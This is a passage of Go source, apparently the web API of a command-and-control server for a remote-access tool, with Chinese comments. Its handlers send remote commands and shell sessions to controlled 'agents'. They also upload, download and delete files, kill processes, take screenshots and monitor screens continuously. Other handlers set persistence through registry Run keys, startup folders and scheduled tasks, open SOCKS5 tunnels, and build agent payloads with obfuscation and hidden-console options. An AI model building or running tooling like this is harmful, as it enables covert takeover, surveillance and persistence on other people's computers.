		command.CmdDeleteFile, command.CmdDeleteDir:
		return true
	default:
		return false
	}
}

// traceSnippet 日志预览，避免单行过长
func traceSnippet(s string, max int) string {
	if max <= 0 || len(s) <= max {
		return s
	}
	return s[:max] + fmt.Sprintf("...(+%dB)", len(s)-max)
}

func isNoisyShellWrite(cmd *command.Command) bool {
	if cmd == nil || cmd.Type != "shell_session_write" {
		return false
	}
	if v, ok := cmd.Payload["input_b64"]; ok {
		if s, ok := v.(string); ok {
			// 单键 Base64 通常很短（1 字节退格≈4 字符）
			return len(s) <= 8
		}
	}
	v, ok := cmd.Payload["input"]
	if !ok {
		return false
	}
	in, ok := v.(string)
	if !ok {
		return false
	}
	// 单字符按键（含方向键/退格等）会非常高频，默认降噪。
	return len(in) <= 3
}

// dispatchCommandToAgent 下发命令：shell 与文件类命令在 Agent 已连接 /ws/agent 时优先 WebSocket，否则走 TCP 一行。
func (s *Server) dispatchCommandToAgent(c *gin.Context, clientID uint, cmd *command.Command) bool {
	cc, ok := agent.GetConnectionManager().Get(clientID)
	if !ok || cc == nil {
		if !isNoisyShellWrite(cmd) {
			log.Printf("[trace] 1/5 HTTP->dispatch FAIL client_id=%d cmd_id=%s type=%s reason=no_tcp", clientID, cmd.ID, cmd.Type)
		}
		log.Printf("[cmd-trace] dispatch: no TCP conn for client_id=%d", clientID)
		_ = s.cmdMgr.CompleteCommand(cmd.ID, "客户端未连接", false)
		return false
	}
	data, err := agent.MarshalAgentCommandLine(cmd.Type, cmd.ID, cmd.Payload)
	if err != nil {
		log.Printf("[trace] 1/5 HTTP->dispatch FAIL client_id=%d cmd_id=%s marshal_err=%v", clientID, cmd.ID, err)
		_ = s.cmdMgr.CompleteCommand(cmd.ID, err.Error(), false)
		return false
	}
	if preferAgentWebSocketDispatch(cmd.Type) && !s.chHub.AgentConnected(clientID) {
		sigHost := s.agentSignalHost(c, clientID)
		sendSig := func(sig map[string]interface{}) error {
			cc2, ok2 := agent.GetConnectionManager().Get(clientID)
			if !ok2 || cc2 == nil {
				return fmt.Errorf("agent tcp not connected")
			}
			return cc2.SendSignal(sig)
		}
		if err := s.chHub.EnsureAgentWSWait(clientID, sigHost, sendSig, 3*time.Second); err != nil {
			log.Printf("[trace] 1/5 pull Agent WS 3s client_id=%d cmd=%s: %v (fallback TCP)", clientID, cmd.Type, err)
		}
	}
	wsOK := preferAgentWebSocketDispatch(cmd.Type) && s.chHub.AgentConnected(clientID)
	// 关闭 shell 必须可靠送达：随后 API 会 CloseAgent 掐断 /ws/agent，走 WS 容易丢帧导致旧进程未清、下次无提示符。
	if cmd.Type == "shell_session_close" {
		wsOK = false
	}
	if cmd.Type == command.CmdListDirChildren || cmd.Type == command.CmdListDir {
		log.Printf("[bp-file] dispatch file cmd client_id=%d cmd_id=%s type=%s try_ws=%v agent_ws_connected=%v",
			clientID, cmd.ID, cmd.Type, wsOK, s.chHub.AgentConnected(clientID))
	}
	if !isNoisyShellWrite(cmd) {
		log.Printf("[trace] 1/5 HTTP->dispatch client_id=%d cmd_id=%s type=%s try_ws=%v json_snip=%q",
			clientID, cmd.ID, cmd.Type, wsOK, traceSnippet(string(data), 220))
	}
	if wsOK {
		if err := s.chHub.SendAgentJSON(clientID, data); err != nil {
			log.Printf("[trace] 1/5 WS send FAIL, fallback TCP: %v", err)
			log.Printf("[cmd-trace] Agent WebSocket 发送失败，回退 TCP: %v", err)
		} else {
			_ = s.cmdMgr.MarkCommandRunning(cmd.ID)
			if cmd.Type == command.CmdListDirChildren || cmd.Type == command.CmdListDir {
				log.Printf("[bp-file] dispatch MarkCommandRunning+WS_SENT client_id=%d cmd_id=%s", clientID, cmd.ID)
			}
			if !isNoisyShellWrite(cmd) {
				log.Printf("[trace] 2/5 backend->Agent [/ws/agent] OK client_id=%d cmd_id=%s type=%s bytes=%d", clientID, cmd.ID, cmd.Type, len(data))
			}
			log.Printf("[cmd-trace] command sent on Agent WebSocket client_id=%d cmd_id=%s type=%s (expect command_response on WS)", clientID, cmd.ID, cmd.Type)
			return true
		}
	}
	log.Printf("[cmd-trace] dispatch TCP client_id=%d cmd_id=%s type=%s", clientID, cmd.ID, cmd.Type)
	if err := cc.SendRawCommandLine(data); err != nil {
		log.Printf("[trace] 2/5 backend->Agent [TCP] FAIL client_id=%d cmd_id=%s err=%v", clientID, cmd.ID, err)
		log.Printf("[cmd-trace] SendRawCommandLine failed: %v", err)
		_ = s.cmdMgr.CompleteCommand(cmd.ID, err.Error(), false)
		return false
	}
	_ = s.cmdMgr.MarkCommandRunning(cmd.ID)
	if cmd.Type == command.CmdListDirChildren || cmd.Type == command.CmdListDir {
		log.Printf("[bp-file] dispatch MarkCommandRunning+TCP_SENT client_id=%d cmd_id=%s", clientID, cmd.ID)
	}
	if !isNoisyShellWrite(cmd) {
		log.Printf("[trace] 2/5 backend->Agent [TCP] OK client_id=%d cmd_id=%s type=%s bytes=%d", clientID, cmd.ID, cmd.Type, len(data))
	}
	log.Printf("[cmd-trace] command sent on TCP client_id=%d cmd_id=%s (result via TCP command_response)", clientID, cmd.ID)
	return true
}

type executeCommandRequest struct {
	Command string `json:"command" binding:"required"`
	Args    string `json:"args"`
}

func (s *Server) handleExecuteCommand(c *gin.Context) {
	clientID, err := strconv.ParseUint(c.Param("id"), 10, 32)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid client id"})
		return
	}

	var req executeCommandRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid request"})
		return
	}

	cmd, err := s.cmdMgr.CreateCommand(uint(clientID), command.CmdExec, map[string]interface{}{
		"command": req.Command,
		"args":    req.Args,
	})
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create command"})
		return
	}
	log.Printf("[cmd-trace] POST /api/clients/%d/command 已创建命令 cmd_id=%s exec=%q", clientID, cmd.ID, req.Command)
	log.Printf("[trace] API POST /clients/%d/command exec=%q -> dispatch", clientID, traceSnippet(req.Command, 80))
	if !s.dispatchCommandToAgent(c, uint(clientID), cmd) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"error": "客户端未在线或未建立 Agent 连接，命令无法下发"})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"command_id": cmd.ID,
		"status":     "running",
	})
}

func (s *Server) handleGetClientCommands(c *gin.Context) {
	clientID, err := strconv.ParseUint(c.Param("id"), 10, 32)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid client id"})
		return
	}

	commands := s.cmdMgr.GetPendingCommands(uint(clientID))
	c.JSON(http.StatusOK, gin.H{"items": commands})
}

func (s *Server) handleGetCommandResult(c *gin.Context) {
	cmdID := c.Param("cmd_id")
	cmd, err := s.cmdMgr.GetCommandResult(cmdID)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "command not found"})
		return
	}
	if cmd.Type == command.CmdListDirChildren || cmd.Type == command.CmdListDir {
		log.Printf("[bp-file] HTTP GET /result cmd_id=%s type=%s status=%s result_len=%d", cmdID, cmd.Type, cmd.Status, len(cmd.Result))
	}
	c.JSON(http.StatusOK, cmd)
}

type listFilesRequest struct {
	Path string `json:"path"`
}

type listFileTreeRequest struct {
	Path  string `json:"path"`
	Depth int    `json:"depth"`
}

func (s *Server) handleListFiles(c *gin.Context) {
	clientID, err := strconv.ParseUint(c.Param("id"), 10, 32)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid client id"})
		return
	}

	var req listFilesRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		req.Path = "."
	}

	cmd, err := s.cmdMgr.CreateCommand(uint(clientID), command.CmdListDir, map[string]interface{}{
		"path": req.Path,
	})
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create command"})
		return
	}
	if !s.dispatchCommandToAgent(c, uint(clientID), cmd) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"error": "客户端未在线或未建立 Agent 连接，命令无法下发"})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"command_id": cmd.ID,
		"status":     "running",
	})
}

func (s *Server) handleListFileTree(c *gin.Context) {
	clientID, err := strconv.ParseUint(c.Param("id"), 10, 32)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid client id"})
		return
	}

	var req listFileTreeRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		req.Path = "."
		req.Depth = 1 // 仅一层：根为盘符/挂载点，子项由前端展开时再拉
	}
	if strings.TrimSpace(req.Path) == "" {
		req.Path = "."
	}
	if req.Depth <= 0 {
		req.Depth = 1
	}
	if req.Depth > 5 {
		req.Depth = 5
	}

	cmd, err := s.cmdMgr.CreateCommand(uint(clientID), command.CmdListDirChildren, map[string]interface{}{
		"path":  req.Path,
		"depth": req.Depth,
	})
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create command"})
		return
	}
	log.Printf("[bp-file] HTTP POST /files/tree client_id=%d cmd_id=%s path=%q depth=%d", clientID, cmd.ID, req.Path, req.Depth)
	if !s.dispatchCommandToAgent(c, uint(clientID), cmd) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"error": "客户端未在线或未建立 Agent 连接，命令无法下发"})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"command_id": cmd.ID,
		"status":     "running",
	})
}

const fileTransferChunkBytes int64 = 256 * 1024

type downloadFileRequest struct {
	RemotePath string `json:"remote_path" binding:"required"`
	Offset     *int64 `json:"offset,omitempty"`
	Length     *int64 `json:"length,omitempty"`
}

func (s *Server) handleDownloadFile(c *gin.Context) {
	clientID, err := strconv.ParseUint(c.Param("id"), 10, 32)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid client id"})
		return
	}

	var req downloadFileRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid request"})
		return
	}

	payload := map[string]interface{}{"path": req.RemotePath}
	if req.Offset != nil {
		payload["offset"] = *req.Offset
		ln := fileTransferChunkBytes
		if req.Length != nil && *req.Length > 0 && *req.Length <= 16*1024*1024 {
			ln = *req.Length
		}
		payload["length"] = ln
	}

	cmd, err := s.cmdMgr.CreateCommand(uint(clientID), command.CmdDownload, payload)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create command"})
		return
	}
	if !s.dispatchCommandToAgent(c, uint(clientID), cmd) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"error": "客户端未在线或未建立 Agent 连接，命令无法下发"})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"command_id": cmd.ID,
		"status":     "running",
	})
}

type uploadFileRequest struct {
	RemotePath string `json:"remote_path" binding:"required"`
	Content    string `json:"content"` // Base64；可空表示 0 字节块
	ChunkIndex *int64 `json:"chunk_index,omitempty"`
}

func (s *Server) handleUploadFile(c *gin.Context) {
	clientID, err := strconv.ParseUint(c.Param("id"), 10, 32)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid client id"})
		return
	}

	var req uploadFileRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid request"})
		return
	}

	payload := map[string]interface{}{
		"path":    req.RemotePath,
		"content": req.Content,
	}
	if req.ChunkIndex != nil {
		payload["chunk_index"] = *req.ChunkIndex
	}

	cmd, err := s.cmdMgr.CreateCommand(uint(clientID), command.CmdUpload, payload)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create command"})
		return
	}
	if !s.dispatchCommandToAgent(c, uint(clientID), cmd) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"error": "客户端未在线或未建立 Agent 连接，命令无法下发"})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"command_id": cmd.ID,
		"status":     "running",
	})
}

type mkdirRequest struct {
	Path string `json:"path" binding:"required"`
}

func (s *Server) handleMkdir(c *gin.Context) {
	clientID, err := strconv.ParseUint(c.Param("id"), 10, 32)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid client id"})
		return
	}

	var req mkdirRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid request"})
		return
	}

	cmd, err := s.cmdMgr.CreateCommand(uint(clientID), command.CmdMkdir, map[string]interface{}{
		"path": req.Path,
	})
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create command"})
		return
	}
	if !s.dispatchCommandToAgent(c, uint(clientID), cmd) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"error": "客户端未在线或未建立 Agent 连接，命令无法下发"})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"command_id": cmd.ID,
		"status":     "running",
	})
}

type deleteFileRequest struct {
	Path  string `json:"path" binding:"required"`
	IsDir bool   `json:"is_dir"`
}

func (s *Server) handleDeleteFile(c *gin.Context) {
	clientID, err := strconv.ParseUint(c.Param("id"), 10, 32)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid client id"})
		return
	}

	var req deleteFileRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid request"})
		return
	}

	cmdType := command.CmdDeleteFile
	if req.IsDir {
		cmdType = command.CmdDeleteDir
	}

	cmd, err := s.cmdMgr.CreateCommand(uint(clientID), cmdType, map[string]interface{}{
		"path": req.Path,
	})
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create command"})
		return
	}
	if !s.dispatchCommandToAgent(c, uint(clientID), cmd) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"error": "客户端未在线或未建立 Agent 连接，命令无法下发"})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"command_id": cmd.ID,
		"status":     "running",
	})
}

func (s *Server) handleListProcesses(c *gin.Context) {
	clientID, err := strconv.ParseUint(c.Param("id"), 10, 32)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid client id"})
		return
	}

	cmd, err := s.cmdMgr.CreateCommand(uint(clientID), command.CmdProcessList, map[string]interface{}{})
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create command"})
		return
	}
	if !s.dispatchCommandToAgent(c, uint(clientID), cmd) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"error": "客户端未在线或未建立 Agent 连接，命令无法下发"})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"command_id": cmd.ID,
		"status":     "running",
	})
}

type killProcessRequest struct {
	PID int `json:"pid" binding:"required"`
}

func (s *Server) handleKillProcess(c *gin.Context) {
	clientID, err := strconv.ParseUint(c.Param("id"), 10, 32)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid client id"})
		return
	}

	var req killProcessRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid request"})
		return
	}

	cmd, err := s.cmdMgr.CreateCommand(uint(clientID), command.CmdKillProcess, map[string]interface{}{
		"pid": req.PID,
	})
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create command"})
		return
	}
	if !s.dispatchCommandToAgent(c, uint(clientID), cmd) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"error": "客户端未在线或未建立 Agent 连接，命令无法下发"})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"command_id": cmd.ID,
		"status":     "running",
	})
}

type screenshotRequest struct {
	Format  string `json:"format"`
	Quality int    `json:"quality"`
}

func (s *Server) handleTakeScreenshot(c *gin.Context) {
	clientID, err := strconv.ParseUint(c.Param("id"), 10, 32)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid client id"})
		return
	}

	var req screenshotRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		req.Format = "png"
		req.Quality = 80
	}

	cmd, err := s.cmdMgr.CreateCommand(uint(clientID), command.CmdScreenshot, map[string]interface{}{
		"format":  req.Format,
		"quality": req.Quality,
	})
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create command"})
		return
	}
	if !s.dispatchCommandToAgent(c, uint(clientID), cmd) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"error": "客户端未在线或未建立 Agent 连接，命令无法下发"})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"command_id": cmd.ID,
		"status":     "running",
	})
}

func (s *Server) handleGetScreenshots(c *gin.Context) {
	clientID, err := strconv.ParseUint(c.Param("id"), 10, 32)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid client id"})
		return
	}

	screenshots := s.screenshotMgr.GetScreenshots(uint(clientID), 20)
	c.JSON(http.StatusOK, gin.H{"items": screenshots})
}

func (s *Server) handleGetScreenshot(c *gin.Context) {
	id := c.Param("id")
	var ss models.Screenshot
	if err := s.db.First(&ss, id).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "screenshot not found"})
		return
	}

	c.Data(http.StatusOK, "image/"+ss.Format, ss.Data)
}

func (s *Server) handleGetLatestScreenshot(c *gin.Context) {
	clientID := c.Param("id")
	var ss models.Screenshot
	if err := s.db.Where("client_id = ?", clientID).Order("created_at desc").First(&ss).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "no screenshot found"})
		return
	}

	c.Data(http.StatusOK, "image/"+ss.Format, ss.Data)
}

type monitorRequest struct {
	Interval int `json:"interval"`
	Quality  int `json:"quality"`
}

func (s *Server) handleStartMonitor(c *gin.Context) {
	clientID, err := strconv.ParseUint(c.Param("id"), 10, 32)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid client id"})
		return
	}

	var req monitorRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		req.Interval = 1000
		req.Quality = 80
	}

	cmd, err := s.cmdMgr.CreateCommand(uint(clientID), "screen_monitor_start", map[string]interface{}{
		"interval": req.Interval,
		"quality":  req.Quality,
	})
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create command"})
		return
	}
	if !s.dispatchCommandToAgent(c, uint(clientID), cmd) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"error": "客户端未在线或未建立 Agent 连接，命令无法下发"})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"command_id": cmd.ID,
		"status":     "running",
	})
}

func (s *Server) handleStopMonitor(c *gin.Context) {
	clientID, err := strconv.ParseUint(c.Param("id"), 10, 32)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid client id"})
		return
	}

	cmd, err := s.cmdMgr.CreateCommand(uint(clientID), "screen_monitor_stop", map[string]interface{}{})
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create command"})
		return
	}
	if !s.dispatchCommandToAgent(c, uint(clientID), cmd) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"error": "客户端未在线或未建立 Agent 连接，命令无法下发"})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"command_id": cmd.ID,
		"status":     "running",
	})
}

type autoStartRequest struct {
	// registry | registry_hkcu: HKCU Run（普通用户可写，仅当前用户）
	// registry_hklm | registry_machine: HKLM Run（通常需管理员）
	// startup_folder: 当前用户「启动」文件夹快捷方式（普通用户可写）
	// startup_folder_all_users: 公共启动文件夹（通常需管理员）
	// scheduled_task: schtasks 登录任务（常需管理员）
	Type string `json:"type"`
}

func (s *Server) handleSetAutoStart(c *gin.Context) {
	clientID, err := strconv.ParseUint(c.Param("id"), 10, 32)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid client id"})
		return
	}

	var req autoStartRequest
	_ = c.ShouldBindJSON(&req)
	if req.Type == "" {
		req.Type = "registry"
	}

	cmd, err := s.cmdMgr.CreateCommand(uint(clientID), command.CmdAutoStartSet, map[string]interface{}{
		"autostart_mode": req.Type,
	})
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create command"})
		return
	}
	if !s.dispatchCommandToAgent(c, uint(clientID), cmd) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"error": "客户端未在线或未建立 Agent 连接，命令无法下发"})
		return
	}
	log.Printf("[autostart-trace] HTTP autostart_set dispatched client_id=%d type=%s cmd_id=%s (等待 Agent command_response)", clientID, req.Type, cmd.ID)

	s.db.Model(&models.Client{}).Where("id = ?", clientID).Updates(map[string]interface{}{
		"auto_start":      true,
		"auto_start_type": req.Type,
	})

	c.JSON(http.StatusOK, gin.H{
		"command_id": cmd.ID,
		"status":     "running",
	})
}

func (s *Server) handleRemoveAutoStart(c *gin.Context) {
	clientID, err := strconv.ParseUint(c.Param("id"), 10, 32)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid client id"})
		return
	}

	cmd, err := s.cmdMgr.CreateCommand(uint(clientID), "autostart_remove", map[string]interface{}{})
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create command"})
		return
	}
	if !s.dispatchCommandToAgent(c, uint(clientID), cmd) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"error": "客户端未在线或未建立 Agent 连接，命令无法下发"})
		return
	}
	log.Printf("[autostart-trace] HTTP autostart_remove dispatched client_id=%d cmd_id=%s (等待 Agent command_response)", clientID, cmd.ID)

	s.db.Model(&models.Client{}).Where("id = ?", clientID).Updates(map[string]interface{}{
		"auto_start":      false,
		"auto_start_type": "",
	})

	c.JSON(http.StatusOK, gin.H{
		"command_id": cmd.ID,
		"status":     "running",
	})
}

func (s *Server) handleListTunnels(c *gin.Context) {
	clientID, err := strconv.ParseUint(c.Param("id"), 10, 32)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid client id"})
		return
	}

	tunnels := s.tunnelMgr.ListTunnels(uint(clientID))
	c.JSON(http.StatusOK, gin.H{"items": tunnels})
}

type createTunnelRequest struct {
	Name       string `json:"name" binding:"required"`
	ListenPort int    `json:"listen_port" binding:"required"`
	TargetHost string `json:"target_host"`
	TargetPort int    `json:"target_port"`
	Type       string `json:"type" binding:"required"` // socks5/tcp_forward
	Username   string `json:"username"`                // SOCKS5 可选用户名
	Password   string `json:"password"`                // SOCKS5 可选密码
}

func (s *Server) handleCreateTunnel(c *gin.Context) {
	clientID, err := strconv.ParseUint(c.Param("id"), 10, 32)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid client id"})
		return
	}

	var req createTunnelRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid request"})
		return
	}

	tunnel, err := s.tunnelMgr.CreateTunnel(uint(clientID), req.Name, req.ListenPort, req.TargetHost, req.TargetPort, req.Type, req.Username, req.Password)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create tunnel"})
		return
	}

	c.JSON(http.StatusOK, tunnel)
}

func (s *Server) handleStartTunnel(c *gin.Context) {
	id := c.Param("id")
	var tunnelID uint
	if _, err := fmt.Sscanf(id, "%d", &tunnelID); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid id"})
		return
	}

	if err := s.tunnelMgr.StartTunnel(tunnelID); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": fmt.Sprintf("failed to start tunnel: %v", err)})
		return
	}

	c.JSON(http.StatusOK, gin.H{"started": true})
}

func (s *Server) handleStopTunnel(c *gin.Context) {
	id := c.Param("id")
	var tunnelID uint
	if _, err := fmt.Sscanf(id, "%d", &tunnelID); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid id"})
		return
	}

	s.tunnelMgr.StopTunnel(tunnelID)
	c.JSON(http.StatusOK, gin.H{"stopped": true})
}

func (s *Server) handleDeleteTunnel(c *gin.Context) {
	id := c.Param("id")
	var tunnelID uint
	if _, err := fmt.Sscanf(id, "%d", &tunnelID); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid id"})
		return
	}

	s.tunnelMgr.DeleteTunnel(tunnelID)
	c.JSON(http.StatusOK, gin.H{"deleted": true})
}

func (s *Server) handleGetPayloadFormats(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{
		"formats": s.payloadGen.GetSupportedFormats(),
		"os":      s.payloadGen.GetSupportedOS(),
		"arch":    s.payloadGen.GetSupportedArch(),
	})
}

type generatePayloadRequest struct {
	ListenerID  uint   `json:"listener_id" binding:"required"`
	OS          string `json:"os" binding:"required"`
	Arch        string `json:"arch" binding:"required"`
	Format      string `json:"format" binding:"required"`
	Obfuscate   bool   `json:"obfuscate"`
	HideConsole bool   `json:"hide_console"`
}

func (s *Server) handleGeneratePayload(c *gin.Context) {
	defer func() {
		if r := recover(); r != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "payload generation failed (service recovered)"})
		}
	}()

	var req generatePayloadRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid request"})
		return
	}

	var listener models.Listener
	if err := s.db.First(&listener, req.ListenerID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "listener not found"})
		return
	}

	cfg := &payload.Config{
		ListenerID:   req.ListenerID,
		Mode:         listener.Mode,
		ServerAddr:   listener.ExternalAddr,
		ExternalAddr: listener.ExternalAddr,
		ListenAddr:   listener.ListenAddr,
		VKey:         listener.VKey,
		Salt:         listener.Salt,
		OS:           req.OS,
		Arch:         req.Arch,
		Format:       req.Format,
		Obfuscate:    req.Obfuscate,
		HideConsole:  req.HideConsole,
	}
	if wh, wpStr, err := net.SplitHostPort(c.Request.Host); err == nil {
		cfg.WebHost = wh
		cfg.WebPort, _ = strconv.Atoi(wpStr)
	}

	outputPath, err := s.payloadGen.Generate(cfg)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": fmt.Sprintf("failed to generate payload: %v", err)})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"success":            true,
		"download_url":       "/api/payloads/download/" + outputPath,
		"suggested_filename": payload.DownloadAttachmentName(outputPath),
	})
}

func (s *Server) handleDownloadPayload(c *gin.Context) {
	filename := filepath.Base(c.Param("filename"))
	if filename == "" || filename == "." || strings.Contains(filename, "..") {
		c.String(http.StatusBadRequest, "invalid filename")
		return
	}
	filePath := filepath.Join(payload.RelPathGenerated, filename)
	if !strings.HasPrefix(filepath.Clean(filePath), filepath.Clean(payload.RelPathGenerated)) {
		c.String(http.StatusBadRequest, "invalid filename")
		return
	}

	dlName := payload.DownloadAttachmentName(filename)
	c.Header("Content-Disposition", "attachment; filename="+dlName)
	c.Header("Content-Type", "application/octet-stream")
	c.File(filePath)
}

type createSessionRequest struct {
	Type string `json:"type" binding:"required"`
}

func (s *Server) handleCreateSession(c *gin.Context) {
	clientID, err := strconv.ParseUint(c.Param("id"), 10, 32)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid client id"})
		return
	}

	var req createSessionRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid request"})
		return
	}

	session := &models.Session{
		ClientID: uint(clientID),
		Type:     req.Type,
		Status:   "active",
	}

	if err := s.db.Create(session).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create session"})
		return
	}

	// shell：先让被控端主动连上 /ws/agent（业务通道），再下发创建会话；输出由 Agent WS 或 TCP 上报后转发到浏览器 WS
	if req.Type == "shell" {
		log.Printf("[trace] 0/5 API POST /clients/%d/session shell: db_session_id=%d ensure AgentWS first", clientID, session.ID)
		sigHost := s.agentSignalHost(c, uint(clientID))
		if err := s.chHub.ForceReconnectAgentWS(uint(clientID), sigHost, func(sig map[string]interface{}) error {
			cc, ok := agent.GetConnectionManager().Get(uint(clientID))
			if !ok || cc == nil {
				return fmt.Errorf("agent tcp not connected")
			}
			return cc.SendSignal(sig)
		}); err != nil {
			log.Printf("[trace] 0/5 ForceReconnectAgentWS FAIL client_id=%d err=%v", clientID, err)
			_ = s.db.Model(session).Update("status", "closed").Error
			c.JSON(http.StatusServiceUnavailable, gin.H{
				"error": "无法建立 Agent 与后端的 WebSocket 业务通道（请确认被控端可访问 Web 服务端口）: " + err.Error(),
			})
			return
		}
		log.Printf("[trace] 0/5 ForceReconnectAgentWS OK client_id=%d signal_host=%q", clientID, sigHost)
		time.Sleep(300 * time.Millisecond)
		sessionID := fmt.Sprintf("%d", session.ID)
		cmd, err := s.cmdMgr.CreateCommand(uint(clientID), "shell_session_create", map[string]interface{}{
			"session_id": sessionID,
		})
		if err != nil || !s.dispatchCommandToAgent(c, uint(clientID), cmd) {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to send session create command"})
			return
		}
	}

	log.Printf("[trace] API session created OK client_id=%d session_row_id=%d type=%s", clientID, session.ID, req.Type)
	c.JSON(http.StatusOK, session)
}

func (s *Server) handleCloseSession(c *gin.Context) {
	sessionID := c.Param("id")

	var session models.Session
	if err := s.db.First(&session, sessionID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "session not found"})
		return
	}

	if err := s.db.Model(&models.Session{}).Where("id = ?", sessionID).Update("status", "closed").Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to close session"})
		return
	}

	// 如果是shell会话，发送关闭会话命令到客户端
	if session.Type == "shell" {
		log.Printf("[trace] API DELETE /sessions/%s shell close -> dispatch shell_session_close client_id=%d", sessionID, session.ClientID)
		cmd, err := s.cmdMgr.CreateCommand(session.ClientID, "shell_session_close", map[string]interface{}{
			"session_id": sessionID,
		})
		if err != nil {
			log.Printf("Failed to create session close command: %v", err)
		} else if !s.dispatchCommandToAgent(c, session.ClientID, cmd) {
